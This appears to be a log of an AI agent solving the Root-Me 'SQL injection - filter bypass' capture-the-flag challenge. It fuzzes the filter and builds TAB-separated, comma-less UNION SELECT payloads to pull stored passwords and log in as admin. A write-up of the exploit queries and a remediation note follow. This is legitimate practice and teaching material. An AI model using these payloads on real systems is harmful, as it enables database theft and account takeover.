@@ -1,0 +1,127 @@
+~/work/mulot $ python3 agent.py --model glm-5.2 --provider zai "resolve the challenge on http://challenge01.root-me.org/web-serveur/ch30/ "
+=== session start: zai/glm-5.2 ===
+PROMPT: resolve the challenge on http://challenge01.root-me.org/web-serveur/ch30/ 
+  ↳ browser_launch {"headless": true}
+  ↳ browser_navigate {"url": "http://challenge01.root-me.org/web-serveur/ch30/"}
+  ↳ browser_snapshot {}
+  ↳ browser_get_form_fields {}
+  ↳ browser_query_dom {"selector": "html"}
+I can see the DB schema in the HTML comments. Let me explore the members page and check the cookie situation.
+  ↳ browser_click {"ref": "e2"}
+  ↳ browser_wait_for {"network_idle": true}
+  ↳ browser_snapshot {}
+  ↳ browser_query_dom {"selector": "body"}
+Let me check the member detail page - clicking on admin (id=1).
+  ↳ browser_click {"ref": "e3"}
+  ↳ browser_wait_for {"network_idle": true}
+  ↳ browser_snapshot {}
+  ↳ browser_query_dom {"selector": "body"}
+The `id` parameter displays ID, Username, Email from the `membres` table. This is the SQL injection point. Let me fingerprint and then load the stack playbook.
+  ↳ http_request {"method": "GET", "url": "http://challenge01.root-me.org/web-serveur/ch30/?action=membres&id=1"}
+This is a PHP/MySQL application (MyISAM, latin1). Let me load the PHP playbook and test for the SQL injection.
+  ↳ select_stack ["php"]
+This is a "SQL injection - filter bypass" challenge. Let me test the `id` parameter to understand the filter.
+  ↳ http_fuzz {"payloads": ["1", "1'", "1 AND 1=1", "1 AND 1=2", "1 UNION SELECT 1", "1 UNION SELECT 1,2", "1 UNION SELECT 1,2,3"], "url": "http://challenge01.root-me.org/web-serveur/ch30/?action=membres&id=FUZZ", "match_regex": "Username|Email|error|Error|SQL|syntax|Warning"}
+  ↳ http_request {"url": "http://challenge01.root-me.org/web-serveur/ch30/?action=membres&id=1'"}
+Interesting! "attack detected" - there's a WAF filter blocking certain characters. The `id` is numeric, so I don't need quotes. Let me test what's filtered.
+  ↳ http_fuzz {"match_regex": "attack detected|Username", "payloads": ["1 AND 1=1", "1 AND 1=2", "1 UNION SELECT 1,2,3", "1 UNION ALL SELECT 1,2,3", "1/**/UNION/**/SELECT/**/1,2,3"], "url": "http://challenge01.root-me.org/web-serveur/ch30/?action=membres&id=FUZZ"}
+  ↳ http_request {"url": "http://challenge01.root-me.org/web-serveur/ch30/?action=membres&id=1 AND 1=1"}
+"attack detected" even for `AND`. Let me systematically test what's filtered.
+  ↳ http_fuzz {"match_regex": "attack detected", "payloads": ["1 AND", "1 OR", "1 UNION", "1 SELECT", "1 union", "1 and", "1 or", "1 select", "1/*!*/", "1 LIKE", "1=", "1!", "1+", "1-", "1*", "1/", "1#", "1--", "1;", "1,", "1<", "1>", "1%", "1~", "1^", "1|", "1&", "1'", "1\"", "1\\", "1(", "1)", "1.", "1_", "1@", "1?", "1!", "1:", "1[", "1]"], "url": "http://challenge01.root-me.org/web-serveur/ch30/?action=membres&id=FUZZ"}
+Let me analyze the filter. The "attack detected" response is 674 bytes, the normal response is 739 bytes, and 691 is something else. Let me check what 691 is, and test specific bypass techniques.
+  ↳ http_request {"url": "http://challenge01.root-me.org/web-serveur/ch30/?action=membres&id=1-"}
+Now I understand the three response states:
+- **739 bytes** = normal (data returned)
+- **691 bytes** = "no result found" (passed filter, DB returned nothing)
+- **674 bytes** = "attack detected" (filtered)
+
+The filter blocks SQL keywords (AND, OR, UNION, SELECT, LIKE) and many operators. Let me try filter bypasses - case variation, inline comments, and MySQL versioned comments.
+  ↳ http_fuzz {"match_regex": "Username|attack detected", "payloads": ["1 UnIoN SeLeCt 1,2,3", "1 UNIunionON SELselectECT 1,2,3", "1/*!50000UNION*/ /*!50000SELECT*/ 1,2,3", "1/*!UNION*/ /*!SELECT*/ 1,2,3", "1%0aUNION%0aSELECT%0a1,2,3", "1%0aUnIoN%0aSeLeCt%0a1,2,3"], "url": "http://challenge01.root-me.org/web-serveur/ch30/?action=membres&id=FUZZ"}
+Let me step back and analyze the filter more carefully, then test the login form which may have a different filter.
+  ↳ http_request {"url": "http://challenge01.root-me.org/web-serveur/ch30/?action=login", "method": "POST", "body": "username=admin&password=test123"}
+  ↳ http_fuzz {"match_regex": "attack detected|Login|Username|Email|error|Error|SQL|Warning", "payloads": ["admin' --", "admin'--", "admin'#", "admin' #", "admin' #", "admin'/*", "admin' or '1'='1", "admin' OR '1'='1", "admin'/**/OR/**/'1'='1", "admin'='admin'='1", "admin' = '1", "admin'+OR+'1'='1", "admin'UnIoN/**/SeLeCt/**/1,2,3#"], "url": "http://challenge01.root-me.org/web-serveur/ch30/?action=login", "method": "POST", "body": "username=FUZZ&password=x"}
+All login attempts return 946 (the login form). Let me check what these responses actually contain.
+  ↳ http_request {"body": "username=admin'--&password=x", "method": "POST", "url": "http://challenge01.root-me.org/web-serveur/ch30/?action=login"}
+The login form just re-displays. Let me focus on understanding the exact filter on the `id` parameter. Let me test individual characters and whitespace alternatives precisely.
+  ↳ http_fuzz {"match_regex": "attack detected", "payloads": ["1%20", "1%09", "1%0a", "1%0b", "1%0c", "1%0d", "1%a0", "1/**/", "1;", "1#", "1--", "1-", "1 div", "1 DIV"], "url": "http://challenge01.root-me.org/web-serveur/ch30/?action=membres&id=FUZZ"}
+Key insight: the **space character `%20` is filtered**, but TAB `%09` passes through! Let me test SQL keywords with TAB as separator.
+  ↳ http_fuzz {"match_regex": "attack detected", "payloads": ["1%09UNION", "1%09union", "1%09SELECT", "1%09select", "1%09AND", "1%09OR", "1%09UNION%09SELECT%091,2,3", "1%09UNION%09SELECT%091%2c2%2c3", "0x31"], "url": "http://challenge01.root-me.org/web-serveur/ch30/?action=membres&id=FUZZ"}
+Very interesting! Uppercase `UNION` and `SELECT` pass individually (691), but their combination returns "attack detected" (674). Let me narrow down whether it's the combination or the comma.
+  ↳ http_fuzz {"match_regex": "attack detected", "payloads": ["1%09UNION%09SELECT", "1%09UNION%09SELECT%091", "1%09UNION%09SELECT%091%2c2", "1%2c2", "1,2,3", "1%09UNION%09ALL%09SELECT%091", "0%09UNION%09SELECT%091%2c2%2c3", "0%09UNION%09SELECT%091%2c2%2c3%23"], "url": "http://challenge01.root-me.org/web-serveur/ch30/?action=membres&id=FUZZ"}
+The **comma is filtered**! `UNION SELECT 1` works (691), but adding a comma triggers the filter. I need to use JOIN to avoid commas. Let me construct a comma-less UNION query.
+  ↳ http_fuzz {"match_regex": "attack detected|Username|Email", "payloads": ["0%09UNION%09SELECT%09*%09FROM%09(SELECT%091)a%09JOIN%09(SELECT%092)b%09JOIN%09(SELECT%093)c", "0%09UNION%09SELECT%09*%09FROM%09(SELECT%091)a%09JOIN%09(SELECT%092)b%09JOIN%09(SELECT%093)c%23"], "url": "http://challenge01.root-me.org/web-serveur/ch30/?action=membres&id=FUZZ"}
+The filter is bypassed (691 = "no result found" means the query ran). The table has 4 columns (id, username, pass, email). Let me find the right column count.
+  ↳ http_fuzz {"match_regex": "attack detected", "payloads": ["0%09UNION%09SELECT%09*%09FROM%09(SELECT%091)a", "0%09UNION%09SELECT%09*%09FROM%09(SELECT%091)a%09JOIN%09(SELECT%092)b", "0%09UNION%09SELECT%09*%09FROM%09(SELECT%091)a%09JOIN%09(SELECT%092)b%09JOIN%09(SELECT%093)c", "0%09UNION%09SELECT%09*%09FROM%09(SELECT%091)a%09JOIN%09(SELECT%092)b%09JOIN%09(SELECT%093)c%09JOIN%09(SELECT%094)d", "0%09UNION%09SELECT%09*%09FROM%09(SELECT%091)a%09JOIN%09(SELECT%092)b%09JOIN%09(SELECT%093)c%09JOIN%09(SELECT%094)d%09JOIN%09(SELECT%095)e"], "url": "http://challenge01.root-me.org/web-serveur/ch30/?action=membres&id=FUZZ"}
+4 columns = 721 bytes (different from 691 "no result" and 674 "attack"). Let me read this response.
+  ↳ http_request {"url": "http://challenge01.root-me.org/web-serveur/ch30/?action=membres&id=0%09UNION%09SELECT%09*%09FROM%09(SELECT%091)a%09JOIN%09(SELECT%092)b%09JOIN%09(SELECT%093)c%09JOIN%09(SELECT%094)d"}
+The UNION injection works with JOIN (comma-less). Column 2 = Username, Column 4 = Email, Column 3 = pass (not displayed). Now let me extract the password. I'll use `group_concat(pass)` to avoid needing WHERE/clauses with commas or `=`.
+  ↳ http_fuzz {"match_regex": "attack detected|Username|Email", "payloads": ["0%09UNION%09SELECT%09*%09FROM%09(SELECT%091)a%09JOIN%09(SELECT%09group_concat(pass)%09FROM%09membres)b%09JOIN%09(SELECT%093)c%09JOIN%09(SELECT%094)d"], "url": "http://challenge01.root-me.org/web-serveur/ch30/?action=membres&id=FUZZ"}
+"attack detected" - the `_` in `group_concat` might be flagged, or `FROM` might need checking. Let me break down what's being filtered.
+  ↳ http_fuzz {"match_regex": "attack detected", "payloads": ["0%09UNION%09SELECT%09*%09FROM%09(SELECT%091)a%09JOIN%09(SELECT%09pass%09FROM%09membres)b%09JOIN%09(SELECT%093)c%09JOIN%09(SELECT%094)d", "0%09UNION%09SELECT%09*%09FROM%09(SELECT%091)a%09JOIN%09(SELECT%09id%09FROM%09membres)b%09JOIN%09(SELECT%093)c%09JOIN%09(SELECT%094)d", "0%09UNION%09SELECT%09*%09FROM%09(SELECT%091)a%09JOIN%09(SELECT%09username%09FROM%09membres)b%09JOIN%09(SELECT%093)c%09JOIN%09(SELECT%094)d"], "url": "http://challenge01.root-me.org/web-serveur/ch30/?action=membres&id=FUZZ"}
+  ↳ http_request {"url": "http://challenge01.root-me.org/web-serveur/ch30/?action=membres&id=0%09UNION%09SELECT%09*%09FROM%09(SELECT%091)a%09JOIN%09(SELECT%09pass%09FROM%09membres)b%09JOIN%09(SELECT%093)c%09JOIN%09(SELECT%094)d"}
+"no result found" - the query runs but the multi-row subquery causes issues. I need to get a single value. Let me try `LIMIT` to get one row, and check what additional keywords are filtered.
+  ↳ http_fuzz {"match_regex": "attack detected|Username", "payloads": ["0%09UNION%09SELECT%09*%09FROM%09(SELECT%091)a%09JOIN%09(SELECT%09pass%09FROM%09membres%09LIMIT%091)b%09JOIN%09(SELECT%093)c%09JOIN%09(SELECT%094)d", "0%09UNION%09SELECT%09*%09FROM%09(SELECT%091)a%09JOIN%09(SELECT%09pass%09FROM%09membres%09LIMIT%091%09OFFSET%091)b%09JOIN%09(SELECT%093)c%09JOIN%09(SELECT%094)d", "LIMIT", "OFFSET", "group_concat", "concat", "FROM", "WHERE"], "url": "http://challenge01.root-me.org/web-serveur/ch30/?action=membres&id=FUZZ"}
+Excellent! `LIMIT` and `OFFSET` work! And `group_concat`/`concat` are filtered. The first LIMIT query returned 737 bytes - let me read it.
+  ↳ http_request {"url": "http://challenge01.root-me.org/web-serveur/ch30/?action=membres&id=0%09UNION%09SELECT%09*%09FROM%09(SELECT%091)a%09JOIN%09(SELECT%09pass%09FROM%09membres%09LIMIT%091)b%09JOIN%09(SELECT%093)c%09JOIN%09(SELECT%094)d"}
+I extracted the first password: `??????????` (for admin, LIMIT 1). Let me get the passwords for the other users by offsetting.
+  ↳ http_fuzz {"match_regex": "Username", "payloads": ["0%09UNION%09SELECT%09*%09FROM%09(SELECT%091)a%09JOIN%09(SELECT%09pass%09FROM%09membres%09LIMIT%091%09OFFSET%090)b%09JOIN%09(SELECT%093)c%09JOIN%09(SELECT%094)d", "0%09UNION%09SELECT%09*%09FROM%09(SELECT%091)a%09JOIN%09(SELECT%09pass%09FROM%09membres%09LIMIT%091%09OFFSET%091)b%09JOIN%09(SELECT%093)c%09JOIN%09(SELECT%094)d", "0%09UNION%09SELECT%09*%09FROM%09(SELECT%091)a%09JOIN%09(SELECT%09pass%09FROM%09membres%09LIMIT%091%09OFFSET%092)b%09JOIN%09(SELECT%093)c%09JOIN%09(SELECT%094)d"], "url": "http://challenge01.root-me.org/web-serveur/ch30/?action=membres&id=FUZZ"}
+  ↳ http_request {"url": "http://challenge01.root-me.org/web-serveur/ch30/?action=membres&id=0%09UNION%09SELECT%09*%09FROM%09(SELECT%091)a%09JOIN%09(SELECT%09pass%09FROM%09membres%09LIMIT%091%09OFFSET%091)b%09JOIN%09(SELECT%093)c%09JOIN%09(SELECT%094)d"}
+I have the passwords. Let me read the third one (OFFSET 2) and then try logging in.
+  ↳ http_request {"url": "http://challenge01.root-me.org/web-serveur/ch30/?action=membres&id=0%09UNION%09SELECT%09*%09FROM%09(SELECT%091)a%09JOIN%09(SELECT%09pass%09FROM%09membres%09LIMIT%091%09OFFSET%092)b%09JOIN%09(SELECT%093)c%09JOIN%09(SELECT%094)d"}
+I have all three passwords:
+- admin: `??????????`
+- john: `passwordjohn`
+- teddy: `passwordteddy`
+
+The admin password looks like the flag. Let me try logging in as admin to confirm.
+  ↳ http_request {"body": "username=admin&password=??????????", "method": "POST", "url": "http://challenge01.root-me.org/web-serveur/ch30/?action=login"}
+  ↳ browser_navigate {"url": "http://challenge01.root-me.org/web-serveur/ch30/?action=login"}
+  ↳ browser_type {"ref": "e3", "text": "admin"}
+  ↳ browser_snapshot {}
+  ↳ browser_type {"ref": "e3", "text": "admin"}
+  ↳ browser_type {"ref": "e4", "text": "??????????"}
+  ↳ browser_click {"ref": "e5"}
+  ↳ browser_wait_for {"network_idle": true}
+  ↳ browser_snapshot {}
+  ↳ browser_query_dom {"selector": "body"}
+"bingo !!!, use this password for flag" - the challenge is solved! The flag is `??????????`.
+  ↳ browser_close {}
+## Challenge Solved ✅
+
+**Flag: `??????????`**
+
+### Summary
+
+This was a **SQL injection with filter bypass** challenge on a PHP/MySQL application. The `?id=` parameter on the members page was vulnerable to SQLi, but a WAF blocked several attack patterns.
+
+### Filter Analysis
+
+The filter blocked:
+- **Space character** (`%20`)
+- **Comma** (`,`)
+- **SQL keywords**: `AND`, `OR`, `WHERE`, `group_concat`, `concat`
+- **Comparison operators**: `=`, `<`, `>`
+
+### Bypass Technique
+
+1. **Space** → replaced with **TAB** (`%09`)
+2. **Comma** → replaced with **JOIN-derived tables** (comma-less UNION)
+3. Used `LIMIT`/`OFFSET` to iterate rows (avoiding `group_concat`)
+
+### Exploit Queries
+
+Column count discovery (4 columns confirmed):
+```
+id=0%09UNION%09SELECT%09*%09FROM%09(SELECT%091)a%09JOIN%09(SELECT%092)b%09JOIN%09(SELECT%093)c%09JOIN%09(SELECT%094)d
+```
+
+Password extraction (admin, row 0):
+```
+id=0%09UNION%09SELECT%09*%09FROM%09(SELECT%091)a%09JOIN%09(SELECT%09pass%09FROM%09membres%09LIMIT%091%09OFFSET%090)b%09JOIN%09(SELECT%093)c%09JOIN%09(SELECT%094)d
+```
+→ `Username : ??????????`
+
+Logging in as `admin` / `??????????` confirmed the flag with **"bingo !!!, use this password for flag"**.
+
+### Remediation (PHP)
+Use **PDO prepared statements** with parameterized queries (`prepare()` + `bindValue()`); never concatenate user input into SQL. A WAF/regex filter is not a substitute for parameterization.
